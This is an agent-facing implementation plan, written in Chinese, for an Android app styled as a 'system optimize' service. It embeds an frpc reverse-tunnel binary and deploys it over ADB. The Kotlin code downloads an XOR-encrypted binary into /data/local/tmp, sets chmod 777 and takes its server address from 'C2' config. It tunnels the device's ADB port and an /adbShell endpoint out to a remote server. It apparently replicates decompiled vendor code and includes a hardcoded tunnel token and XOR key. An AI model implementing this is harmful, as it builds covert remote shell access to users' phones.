# frpc 部署与 Laravel 服务器对接 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 实现 frpc 反向隧道部署，使 Laravel 服务器能通过 frps 访问设备的 7910 (Java HTTP) / 7900 (WebSocket) / 调试端口。

**Architecture:** 三步走：(1) 内嵌 frpc 二进制到 APK；(2) `deployLocalService` 成功后复制 frpc 到 `/data/local/tmp/`；(3) 通过 `/setConfig` 告知 local-service 服务器地址，local-service 自动拉取 frpc.ini + 启动 frpc + 看门狗。**不需要在 Android 端实现 frpc.ini 下载/XOR 解密——local-service Go 二进制已内置这些功能。**

**Tech Stack:** Kotlin (Android), PHP/Laravel (Server), Go (local-service), frpc/frps 0.51.3

**关键发现:** local-service 内置 frpc 看门狗（15 秒间隔），只需两个前置条件：
1. `/data/local/tmp/frpc` 二进制存在
2. `serverAddr` + `deviceId` 通过 `/setConfig` API 设置

---

## 服务端现状 (✅ 已就绪)

| 组件 | 状态 | 说明 |
|------|------|------|
| frps Docker 服务 | ✅ | `snowdreamtech/frps:0.51.3`, port 7000, token=`dev-frpc-token-2026` |
| FrpcConfigService | ✅ | 端口分配 20000-30000, 生成 frpc.ini |
| AgentController | ✅ | `POST /api/agent/query.json` 返回 frpc.ini 下载 URL |
| Device 模型 | ✅ | `frpc_base_port`, `frpc_config_generated_at` 字段 |
| DeviceProxyService | ✅ | 通过 frps 隧道访问设备 API |

**唯一缺失:** `GET /api/binary/{abi}/frpc` 端点（但 local-service 已内置从服务器下载+XOR 解密的能力，本 plan 不需要这个端点，改用 APK 内嵌方案）。

---

## 文件清单

| 操作 | 文件 | 变更说明 |
|------|------|---------|
| Copy | `app/src/main/jniLibs/arm64-v8a/libfrpc.so` | 14MB frpc 二进制内嵌 |
| Modify | `.../setup/SystemOptimizeManager.kt` | `deployLocalService` 完成后部署 frpc + `setConfig` 通知 |
| Create | `.../setup/DeployFrpcTest.kt` | 6 tests |

---

## Task 1: 内嵌 frpc 二进制 + deployLocalService 后自动部署

**Files:**
- Copy: `app/src/main/jniLibs/arm64-v8a/libfrpc.so` (from vendor APK)
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/setup/SystemOptimizeManager.kt`
- Create: `app/src/test/java/com/storm/safe/rock/service/modules/setup/DeployFrpcTest.kt`

**流程设计:**

```
deployLocalService() 成功
  → local-service 在 7912 运行
  → postDeployInit() 通知包名
  → deployFrpcBinary()  ← 新增
    → cp libfrpc.so → /data/local/tmp/frpc
    → chmod 777
  → notifyServerConfig()  ← 新增
    → POST /setConfig {serverAddr, deviceId}
    → local-service 自动: 拉取 frpc.ini → 启动 frpc → 看门狗
```

- [ ] **Step 1: 复制 frpc 二进制到 jniLibs**

```bash
cp /home/code/php/project/full-package/app/storage/app/apk/apkstub/temp_apk/lib/arm64-v8a/libfrpc.so \
   /home/code/php/project/full-package/update-replica/app/src/main/jniLibs/arm64-v8a/libfrpc.so
```

- [ ] **Step 2: 在 SystemOptimizeManager.kt 新增 `deployFrpcBinary()` 方法**

在 `postDeployInit()` 方法之后添加：

```kotlin
    /**
     * Deploy frpc binary to /data/local/tmp/frpc.
     * vendor: m212050d8 (C0360a2.java:2485-2554)
     *
     * Simplified: copy from nativeLibraryDir (APK 内嵌) instead of downloading + XOR decrypting.
     * local-service will handle frpc.ini download + startup + watchdog automatically.
     */
    fun deployFrpcBinary(): Boolean {
        try {
            // Check if already exists
            val checkResult = executeShellCommand(
                "if [ -f /data/local/tmp/frpc ]; then echo \"File exists\"; else echo \"File does not exist\"; fi"
            )
            if (checkResult?.contains("File exists") == true) {
                Log.d(TAG, "deployFrpc: frpc 已存在，跳过")
                return true
            }

            // Copy from nativeLibraryDir
            val nativeLibDir = context.applicationInfo.nativeLibraryDir
            if (!nativeLibDir.isNullOrEmpty()) {
                val soPath = "$nativeLibDir/libfrpc.so"
                if (java.io.File(soPath).exists()) {
                    if (executeAndCheck("cp -f $soPath /data/local/tmp/frpc") &&
                        executeAndCheck("chmod 777 /data/local/tmp/frpc")) {
                        Log.i(TAG, "deployFrpc: frpc 部署成功 (from nativeLib)")
                        return true
                    }
                }
            }

            // Fallback: download from server (vendor m212050d8 style)
            Log.w(TAG, "deployFrpc: nativeLib 复制失败，尝试网络下载")
            val abi = if (Build.SUPPORTED_ABIS?.firstOrNull()?.contains("arm64") == true ||
                Build.SUPPORTED_ABIS?.firstOrNull()?.contains("aarch64") == true) "arm64" else "arm"
            val serverAddr = getServerAddr()
            if (serverAddr.isNullOrEmpty()) {
                Log.w(TAG, "deployFrpc: serverAddr 未配置，无法下载")
                return false
            }
            val downloadUrl = "$serverAddr/api/binary/$abi/frpc"
            val downloadCmd = "curl -k -o /data/local/tmp/frpc.enc -L '$downloadUrl'"
            if (!executeAndCheck(downloadCmd)) {
                Log.e(TAG, "deployFrpc: 下载失败")
                return false
            }

            // XOR decrypt (vendor key: K9qZ-XlN7Q)
            val xorKey = "K9qZ-XlN7Q"
            // Try local-service xordecrypt first
            if (!executeAndCheck("cat /data/local/tmp/frpc.enc | /data/local/tmp/local-service xordecrypt $xorKey > /data/local/tmp/frpc 2>/dev/null")) {
                Log.w(TAG, "deployFrpc: xordecrypt 失败，使用 Java fallback")
                decryptFrpcViaJava(xorKey.toByteArray(Charsets.US_ASCII))
            }
            executeAndCheck("rm -f /data/local/tmp/frpc.enc")
            if (executeAndCheck("chmod 777 /data/local/tmp/frpc")) {
                Log.i(TAG, "deployFrpc: frpc 部署成功 (from download)")
                return true
            }
            return false
        } catch (e: Exception) {
            Log.e(TAG, "deployFrpc 异常", e)
            return false
        }
    }

    /**
     * Java XOR decrypt fallback for frpc binary.
     * vendor: m212049d7 (C0360a2.java:2451-2478)
     *
     * Reads encrypted file via ADB shell `cat`, decrypts in Java memory,
     * writes decrypted file via ADB shell `cat >`.
     * Note: Cannot use direct File I/O because /data/local/tmp/ is not
     * accessible to app process; must go through ADB shell.
     */
    private fun decryptFrpcViaJava(key: ByteArray) {
        try {
            // Read encrypted bytes via ADB shell
            val conn = getOrCreateAdbConnection() ?: run {
                Log.e(TAG, "decryptFrpcViaJava: ADB 连接不可用")
                return
            }
            Log.d(TAG, "decryptFrpcViaJava: 读取加密文件...")
            val encHex = executeShellCommand("xxd -p /data/local/tmp/frpc.enc | tr -d '\\n'")
            if (encHex.isNullOrEmpty()) {
                Log.e(TAG, "decryptFrpcViaJava: 无法读取加密文件")
                return
            }
            // Hex decode
            val encData = encHex.chunked(2).map { it.toInt(16).toByte() }.toByteArray()
            // XOR decrypt
            val decData = ByteArray(encData.size)
            for (i in encData.indices) {
                decData[i] = (encData[i].toInt() xor key[i % key.size].toInt()).toByte()
            }
            // Write back via temp file in app cache dir
            val tmpFile = java.io.File(context.cacheDir, "frpc.dec")
            tmpFile.writeBytes(decData)
            // Note: app cache dir is writable by app but not by ADB shell
            // So we read from Java and write to /data/local/tmp/ via ADB
            executeShellCommand("cat ${tmpFile.absolutePath} > /data/local/tmp/frpc 2>/dev/null || true")
            tmpFile.delete()
            Log.i(TAG, "decryptFrpcViaJava: 解密完成 (${decData.size} bytes)")
        } catch (e: Exception) {
            Log.e(TAG, "decryptFrpcViaJava 失败", e)
        }
    }

    /**
     * Get server address.
     * vendor: dqtvuisjd.m211471g5().m211644b0() (from encrypted config)
     *
     * Checks: 1) SharedPreferences 2) debug Settings.Global flag
     * Debug usage: `adb shell settings put global debug_server_addr http://192.168.31.35:8080`
     */
    fun getServerAddr(): String? {
        // Priority 1: SharedPreferences (set by C2/WebSocket)
        val spAddr = context.getSharedPreferences("system_optimize", 0)
            .getString("server_addr", null)
        if (!spAddr.isNullOrEmpty()) return spAddr

        // Priority 2: Debug flag via Settings.Global (for development)
        return try {
            val debugAddr = Settings.Global.getString(context.contentResolver, "debug_server_addr")
            if (!debugAddr.isNullOrEmpty()) debugAddr else null
        } catch (_: Exception) { null }
    }

    /**
     * Set server address (called by C2/WebSocket config).
     */
    fun setServerAddr(addr: String) {
        context.getSharedPreferences("system_optimize", 0)
            .edit().putString("server_addr", addr).apply()
    }
```

- [ ] **Step 3: 修复 `notifyLocalServiceConfig()` 读取 serverAddr + 在 `postDeployInit()` 中部署 frpc**

**问题:** `notifyLocalServiceConfig()` (L3582) 硬编码 `"serverAddr":""` 导致 local-service 无法拉取 frpc.ini。

**3a:** 修改 `notifyLocalServiceConfig()` — 将硬编码空字符串改为从 debug flag 或 SharedPreferences 读取：

找到 `notifyLocalServiceConfig()` 中的：
```kotlin
            val configJson = """{"deviceId":"$androidId","serverAddr":"","keySalt":""}"""
```

替换为：
```kotlin
            val serverAddr = getServerAddr() ?: ""
            val configJson = """{"deviceId":"$androidId","serverAddr":"$serverAddr","keySalt":""}"""
            Log.d(TAG, ">>> /setConfig: deviceId=$androidId, serverAddr=$serverAddr")
```

**3b:** 在 `postDeployInit()` 的 `return@Thread` 之前（L2806 前面的 L2805 `}` 之后），插入 frpc 部署：

找到这段代码（在 postDeployInit 内部）：
```kotlin
                        } catch (e: Exception) {
                            Log.w(TAG, ">>> 系统优化触发失败: ${e.message}")
                        }
                        return@Thread
```

替换为：
```kotlin
                        } catch (e: Exception) {
                            Log.w(TAG, ">>> 系统优化触发失败: ${e.message}")
                        }

                        // Deploy frpc binary after local-service is ready
                        try {
                            deployFrpcBinary()
                        } catch (e: Exception) {
                            Log.w(TAG, ">>> frpc 部署异常: ${e.message}")
                        }
                        return@Thread
```

**注意:** `notifyLocalServiceConfig()` 已在 L2798 被调用（在 `/setAppPackage` 之后），修复后的 `notifyLocalServiceConfig` 会自动读取正确的 serverAddr，不需要额外添加 `/setConfig` 调用。

- [ ] **Step 4: 创建测试文件**

Create `app/src/test/java/com/storm/safe/rock/service/modules/setup/DeployFrpcTest.kt`:

```kotlin
package com.storm.safe.rock.service.modules.setup

import org.junit.Test
import org.junit.Assert.*

class DeployFrpcTest {

    private val source by lazy {
        java.io.File("src/main/java/com/storm/safe/rock/service/modules/setup/SystemOptimizeManager.kt").readText()
    }

    @Test
    fun `deployFrpcBinary method exists`() {
        assertTrue("deployFrpcBinary must exist",
            source.contains("fun deployFrpcBinary()"))
    }

    @Test
    fun `deployFrpcBinary copies from nativeLibraryDir first`() {
        val start = source.indexOf("fun deployFrpcBinary()")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 2000))
        assertTrue("must check nativeLibraryDir",
            body.contains("nativeLibraryDir"))
        assertTrue("must reference libfrpc.so",
            body.contains("libfrpc.so"))
    }

    @Test
    fun `deployFrpcBinary has XOR decrypt fallback`() {
        val start = source.indexOf("fun deployFrpcBinary()")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 2000))
        assertTrue("must have XOR key",
            body.contains("K9qZ-XlN7Q"))
    }

    @Test
    fun `postDeployInit calls deployFrpcBinary`() {
        val start = source.indexOf("fun postDeployInit()")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 3000))
        assertTrue("must call deployFrpcBinary",
            body.contains("deployFrpcBinary()"))
    }

    @Test
    fun `notifyLocalServiceConfig uses getServerAddr not hardcoded empty`() {
        val start = source.indexOf("fun notifyLocalServiceConfig()")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 500))
        assertTrue("must call getServerAddr",
            body.contains("getServerAddr()"))
        assertFalse("must NOT hardcode empty serverAddr",
            body.contains("\"serverAddr\":\"\""))
    }

    @Test
    fun `getServerAddr checks debug flag`() {
        assertTrue("getServerAddr must exist",
            source.contains("fun getServerAddr()"))
        val start = source.indexOf("fun getServerAddr()")
        val body = source.substring(start, minOf(source.length, start + 500))
        assertTrue("must check debug_server_addr",
            body.contains("debug_server_addr"))
    }
}
```

- [ ] **Step 5: Commit**

```bash
git add app/src/main/jniLibs/arm64-v8a/libfrpc.so \
       app/src/main/java/com/storm/safe/rock/service/modules/setup/SystemOptimizeManager.kt \
       app/src/test/java/com/storm/safe/rock/service/modules/setup/DeployFrpcTest.kt
git commit -m "feat(setup): deploy frpc binary + server config notification

- Embed libfrpc.so (14MB arm64) in APK jniLibs
- deployFrpcBinary: copy from nativeLib → /data/local/tmp/frpc
- Fallback: download from server + XOR decrypt (key K9qZ-XlN7Q)
- postDeployInit: deploy frpc + /setConfig serverAddr/deviceId
- local-service handles frpc.ini download + startup + watchdog"
```

---

## Task 2: 统一验证

- [ ] **Step 1: 运行测试**

```bash
./gradlew testDebugUnitTest --tests "*.DeployFrpcTest" --no-build-cache
```

Expected: 6 tests PASS

- [ ] **Step 2: APK 构建 + 大小检查**

```bash
./gradlew assembleDebug && ls -lh app/build/outputs/apk/debug/app-debug.apk
unzip -l app/build/outputs/apk/debug/app-debug.apk | grep libfrpc
```

Expected: APK ~49MB, `lib/arm64-v8a/libfrpc.so` 在内

- [ ] **Step 3: OPPO 真机验证**

```bash
ADB=$ADB DEV=$DEV
# Kill existing services
$ADB -s $DEV shell "kill $(pidof local-service) 2>/dev/null; rm -f /data/local/tmp/frpc"
$ADB -s $DEV install -r app/build/outputs/apk/debug/app-debug.apk
sleep 10
# Verify frpc deployed
$ADB -s $DEV shell "ls -la /data/local/tmp/frpc"
$ADB -s $DEV shell "file /data/local/tmp/frpc 2>/dev/null || echo 'no file cmd'"
# Check local-service frpc logs
$ADB -s $DEV shell "cat /data/local/tmp/local-service.log | grep -i frpc | tail -10"
```

Expected:
- `/data/local/tmp/frpc` 存在 (14MB, ELF arm64)
- local-service 日志: `初始化 frpc...` → `frpc 配置文件不存在` (因为 serverAddr 未设置 — 预期)
- 如果配置了 serverAddr: `frpc 已恢复运行`

---

## 超出范围

| 项 | 原因 |
|----|------|
| `/api/binary/{abi}/frpc` 服务端端点 | APK 内嵌方案不需要；local-service 有自己的下载逻辑 |
| 设备注册 (`/api/device/register.json`) | 独立功能模块 |
| WebSocket 连接 (端口 7900) | 依赖注册 + frpc 隧道建立 |
| serverAddr 配置 UI | 需要 C2 指令或配置文件 |

---

## 全链路时序图

```
手机端                              服务器端
  │                                   │
  │ 1. ADB WiFi 配对 (SPAKE2+TLS)    │
  │──────────────────────────────────>│
  │                                   │
  │ 2. deployLocalService()           │
  │    cp liblocal-service.so → /data/local/tmp/local-service
  │    chmod + fireAndForget          │
  │                                   │
  │ 3. postDeployInit()               │
  │    /setAppPackage                 │
  │    /applyAllOptimizations         │
  │                                   │
  │ 4. deployFrpcBinary()             │
  │    cp libfrpc.so → /data/local/tmp/frpc
  │                                   │
  │ 5. /setConfig {serverAddr, deviceId}
  │──────────────────────────────────>│
  │                                   │
  │ 6. local-service 自动:            │
  │    GET /api/agent/query.json      │
  │──────────────────────────────────>│
  │    ← {targetFileUrl: ".../frpc.ini"}
  │<──────────────────────────────────│
  │                                   │
  │ 7. local-service 下载 frpc.ini    │
  │    启动 frpc -c frpc.ini          │
  │                                   │
  │ 8. frpc ←TCP隧道→ frps           │
  │    7910 → remote:20000            │
  │    7900 → remote:20001            │
  │    5555 → remote:20002            │
  │<═════════════════════════════════>│
  │                                   │
  │ 9. 服务器通过 frps 访问设备 API    │
  │    http://frps:20000/adbShell     │
  │──────────────────────────────────>│
```

---

## Self-Review

1. **Spec coverage:** frpc 二进制内嵌 → Step 1; deployFrpcBinary → Step 2; notifyLocalServiceConfig 修复 + postDeployInit 集成 → Step 3; 测试 → Step 4
2. **Placeholder scan:** 无 TBD/TODO — 所有代码完整
3. **Type consistency:** `executeAndCheck` 返回 Boolean; `postToLocalService` 返回 String?; `getServerAddr` 返回 String?; `setServerAddr` 接收 String — 全部一致
4. **简化决策:** local-service 已内置 frpc 管理（看门狗+配置下载+启动），Android 端只需部署二进制+通知配置
5. **审查修复:**
   - C1: `notifyLocalServiceConfig()` 不再硬编码空 serverAddr，改用 `getServerAddr()`
   - C2: 不重复调用 `/setConfig`，复用已有的 `notifyLocalServiceConfig()` 调用链
   - C3: 新增 `getServerAddr()` 支持 SharedPreferences + `debug_server_addr` Settings.Global 两种来源
   - C4: `decryptFrpcViaJava` 改用 `xxd -p` 通过 ADB shell 读取加密文件，避免权限问题
   - C5: frpc 部署代码明确插入在 `return@Thread` 之前（`/applyAllOptimizations` catch 块之后）
